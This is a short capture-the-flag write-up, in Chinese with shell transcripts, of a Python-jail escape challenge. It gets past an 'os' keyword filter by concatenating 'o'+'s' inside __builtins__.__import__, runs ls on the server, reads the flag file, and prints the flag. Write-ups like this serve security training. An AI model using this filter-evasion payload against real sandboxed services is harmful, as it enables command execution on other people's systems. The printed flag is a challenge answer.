# I want to break free

*I want to break free... from this Python jail. nc 143.198.184.186 45457*

---
使用`'o'+'s'`绕过对os的过滤,执行ls命令,发现存在文件`cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt`

```shell
~$ nc 143.198.184.186 45457

    You are in jail. Can you escape?

> __builtins__.__import__('o'+'s').system('ls')
bin
blacklist.txt
boot
cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt
dev
etc
home
jail.py
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
None
```

读取文件内容

```shell
> print(__builtins__.open('cf7728be7980fd770ce03d9d937d6d4087310f02db7fcba6ebbad38bd641ba19.txt').read())
kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}

None
```

**flag:**`kqctf{0h_h0w_1_w4n7_70_br34k_fr33_e73nfk1788234896a174nc}`
